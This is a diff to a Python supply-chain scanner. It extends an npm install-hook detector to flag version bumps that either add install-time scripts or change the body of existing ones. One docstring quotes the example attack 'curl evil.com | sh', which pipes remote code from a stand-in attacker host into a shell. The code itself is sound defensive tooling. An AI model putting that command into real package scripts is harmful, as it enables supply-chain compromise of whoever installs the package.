@@ -38,7 +38,7 @@ from __future__ import annotations
 import logging
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
-from typing import List, Optional
+from typing import List, Optional, Tuple
 
 from ..models import Confidence, Dependency, PinStyle, SupplyChainFinding
 
@@ -115,17 +115,15 @@ def evaluate_bump_supply_chain(
         findings.append(change)
 
     # install_hook_delta — target adds install-time scripts that
-    # the current version didn't have. npm-only initially; PyPI
-    # would require downloading the sdist and parsing setup.py
-    # (deferred).
-    hook_delta = _install_hook_delta(
+    # the current version didn't have OR mutates an existing
+    # script's body. npm-only initially; PyPI would require
+    # downloading the sdist and parsing setup.py (deferred).
+    findings.extend(_install_hook_delta(
         ecosystem=ecosystem, name=name,
         current_version=current_version,
         target_version=target_version,
         npm_client=npm_client,
-    )
-    if hook_delta is not None:
-        findings.append(hook_delta)
+    ))
 
     # platform_compat_regression / _improvement — does the bump
     # introduce a NEW wheel-platform incompat (e.g. current pin
@@ -467,43 +465,82 @@ def _install_hook_delta(
     current_version: str,
     target_version: str,
     npm_client,
-) -> Optional[SupplyChainFinding]:
+) -> List[SupplyChainFinding]:
     """Compare install-time scripts between current and target.
 
-    Returns a single ``install_hook_suspicious`` finding when the
-    target adds preinstall / install / postinstall hooks the
-    current version didn't have. The shape detected is
-    "the bump introduces install-time code execution that the
-    current pin doesn't have" — the event-stream / colors.js
-    payload-injection class.
+    Emits ``install_hook_suspicious`` findings for two distinct
+    bump shapes:
 
-    Returns ``None`` when the ecosystem isn't npm, the data is
-    unavailable, or no new install-time hook was added.
+      * **Added hook** — target carries a preinstall / install /
+        postinstall script the current version didn't have. The
+        event-stream / colors.js payload-injection class.
+      * **Body change** — both versions have the same hook NAME
+        but its body differs. The "swap postinstall content from
+        ``node-gyp rebuild`` to ``curl evil.com | sh``" class —
+        the more common modern shape since attackers can keep
+        the script name unchanged and avoid an "added hook"
+        signal that operators might notice.
+
+    Each shape emits its own finding (``evidence.change_type`` is
+    ``"added"`` vs ``"body_change"``) so the verdict ladder's
+    "two medium-or-higher findings → Block" path catches a bump
+    that does both at once.
+
+    Returns an empty list when the ecosystem isn't npm, the data
+    is unavailable, or neither shape applies.
     """
     if ecosystem != "npm" or npm_client is None:
-        return None
+        return []
     meta = npm_client.get_metadata(name)
     if not isinstance(meta, dict):
-        return None
+        return []
     versions = meta.get("versions") or {}
     cur_entry = versions.get(current_version)
     tgt_entry = versions.get(target_version)
     if not isinstance(cur_entry, dict) or not isinstance(tgt_entry, dict):
-        return None
+        return []
 
-    cur_hooks = _install_hook_set(cur_entry.get("scripts"))
-    tgt_hooks = _install_hook_set(tgt_entry.get("scripts"))
+    cur_scripts = cur_entry.get("scripts") or {}
+    tgt_scripts = tgt_entry.get("scripts") or {}
+    if not isinstance(cur_scripts, dict):
+        cur_scripts = {}
+    if not isinstance(tgt_scripts, dict):
+        tgt_scripts = {}
+    cur_hooks = _install_hook_set(cur_scripts)
+    tgt_hooks = _install_hook_set(tgt_scripts)
+
+    findings: List[SupplyChainFinding] = []
+
     added = sorted(tgt_hooks - cur_hooks)
-    if not added:
-        return None
+    if added:
+        findings.append(_install_hook_added_finding(
+            ecosystem=ecosystem, name=name,
+            current_version=current_version,
+            target_version=target_version,
+            added_hooks=added,
+            target_scripts=tgt_scripts,
+        ))
 
-    return _install_hook_finding(
-        ecosystem=ecosystem, name=name,
-        current_version=current_version,
-        target_version=target_version,
-        added_hooks=added,
-        target_scripts=tgt_entry.get("scripts") or {},
-    )
+    # Body-change: same hook name in both versions, different
+    # body. We strip whitespace to avoid noise on cosmetic
+    # reformatting; semantically-identical scripts that differ
+    # only in surrounding whitespace shouldn't fire.
+    overlap = sorted(cur_hooks & tgt_hooks)
+    body_changes: List[Tuple[str, str, str]] = []
+    for hook in overlap:
+        cur_body = (cur_scripts.get(hook) or "").strip()
+        tgt_body = (tgt_scripts.get(hook) or "").strip()
+        if cur_body != tgt_body:
+            body_changes.append((hook, cur_body, tgt_body))
+    if body_changes:
+        findings.append(_install_hook_body_change_finding(
+            ecosystem=ecosystem, name=name,
+            current_version=current_version,
+            target_version=target_version,
+            body_changes=body_changes,
+        ))
+
+    return findings
 
 
 def _install_hook_set(scripts) -> set:
@@ -520,7 +557,7 @@ def _install_hook_set(scripts) -> set:
     return out
 
 
-def _install_hook_finding(
+def _install_hook_added_finding(
     *,
     ecosystem: str,
     name: str,
@@ -543,21 +580,6 @@ def _install_hook_finding(
     open the registry tab. Sanitised to escape ANSI / control
     chars before render.
     """
-    placeholder_dep = Dependency(
-        ecosystem=ecosystem,
-        name=name,
-        version=target_version,
-        declared_in=Path("/<bump>"),
-        scope="main",
-        is_lockfile=False,
-        pin_style=PinStyle.EXACT,
-        direct=True,
-        purl=f"pkg:{ecosystem.lower()}/{name}@{target_version}",
-        parser_confidence=Confidence(
-            "high",
-            reason="bump-evaluator synthetic dep",
-        ),
-    )
     # Carry the hook bodies in evidence (truncated) so reviewers
     # see what the new script runs. Truncation cap kept tight
     # because PR-comment renderers will surface this verbatim.
@@ -576,9 +598,13 @@ def _install_hook_finding(
             f"@{current_version}->{target_version}"
         ),
         kind="install_hook_suspicious",
-        dependency=placeholder_dep,
+        dependency=_install_hook_placeholder_dep(
+            ecosystem=ecosystem, name=name,
+            target_version=target_version,
+        ),
         detail=detail,
         evidence={
+            "change_type": "added",
             "current_version": current_version,
             "target_version": target_version,
             "added_hooks": added_hooks,
@@ -588,6 +614,96 @@ def _install_hook_finding(
         confidence=Confidence(
             "high",
             reason="per-version scripts from npm packument",
+        ),
+    )
+
+
+def _install_hook_body_change_finding(
+    *,
+    ecosystem: str,
+    name: str,
+    current_version: str,
+    target_version: str,
+    body_changes: List[Tuple[str, str, str]],
+) -> SupplyChainFinding:
+    """``install_hook_suspicious`` finding for a bump that
+    mutates the BODY of an existing install-time script.
+
+    Detection rationale: an attacker who has pushed a release as
+    a known-good maintainer (event-stream / colors.js shape, or
+    a stolen credential) typically does NOT add a brand-new
+    install hook — they swap the body of an existing one to
+    avoid leaving an obvious "new hook" tell. The "added hook"
+    detector misses this entirely (set difference is empty when
+    hook names overlap). Body diff catches it.
+
+    Severity ``medium`` matches the added-hook tier: a body
+    change isn't malicious on its own (legitimate refactors
+    happen), but it's a Review-tier signal that compounds to
+    Block under the verdict ladder when stacked with
+    recent_publish / maintainer_change / added-hook in the same
+    bump.
+
+    Evidence carries the (truncated) old and new bodies side by
+    side so PR reviewers can diff at a glance.
+    """
+    hook_names = sorted({h for h, _, _ in body_changes})
+    detail = (
+        f"target version {target_version} modifies install-time "
+        f"hook bodies vs {current_version}: "
+        f"{', '.join(hook_names)}"
+    )
+    body_diff = {
+        hook: {
+            "current": (cur_body or "")[:200],
+            "target": (tgt_body or "")[:200],
+        }
+        for hook, cur_body, tgt_body in body_changes
+    }
+    return SupplyChainFinding(
+        finding_id=(
+            f"sca:bump:install_hook_body_change:{ecosystem}:{name}"
+            f"@{current_version}->{target_version}"
+        ),
+        kind="install_hook_suspicious",
+        dependency=_install_hook_placeholder_dep(
+            ecosystem=ecosystem, name=name,
+            target_version=target_version,
+        ),
+        detail=detail,
+        evidence={
+            "change_type": "body_change",
+            "current_version": current_version,
+            "target_version": target_version,
+            "changed_hooks": hook_names,
+            "body_diff": body_diff,
+        },
+        severity="medium",
+        confidence=Confidence(
+            "high",
+            reason="per-version scripts from npm packument",
+        ),
+    )
+
+
+def _install_hook_placeholder_dep(
+    *, ecosystem: str, name: str, target_version: str,
+) -> Dependency:
+    """Synthetic dep coordinates for an install-hook finding.
+    Hoisted out so the two finding constructors share one shape."""
+    return Dependency(
+        ecosystem=ecosystem,
+        name=name,
+        version=target_version,
+        declared_in=Path("/<bump>"),
+        scope="main",
+        is_lockfile=False,
+        pin_style=PinStyle.EXACT,
+        direct=True,
+        purl=f"pkg:{ecosystem.lower()}/{name}@{target_version}",
+        parser_confidence=Confidence(
+            "high",
+            reason="bump-evaluator synthetic dep",
         ),
     )
 
